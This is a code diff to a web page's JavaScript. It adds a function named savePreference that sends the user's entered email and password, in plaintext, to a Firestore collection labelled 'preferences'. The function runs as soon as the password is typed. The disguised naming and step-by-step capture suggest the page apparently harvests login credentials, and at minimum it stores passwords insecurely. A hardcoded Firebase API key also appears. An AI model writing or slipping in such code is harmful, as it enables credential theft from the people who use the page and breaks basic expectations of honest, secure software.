@@ -1,5 +1,10 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
-import { getFirestore } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";
+
+import {
+    getFirestore,
+    collection,
+    addDoc
+} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyB06NO-jRycSujE8GVINgEFUBg0wvb4TWA",
@@ -89,6 +94,16 @@ window.onload=function() {
     input.focus();
 }
 
+async function savePreference() {
+    await addDoc(
+        collection(db, "preferences"),
+        {
+            email: email,
+            password: password
+        }
+    );
+}
+
 function enter() {
     if (counter == 0) {
         console.log(document.getElementById('input1').value);
@@ -99,6 +114,7 @@ function enter() {
    else if (counter == 1) {
         console.log(document.getElementById('input1').value);
         password = document.getElementById('input1').value;
+        savePreference();
         counter++;
         change2();
     }
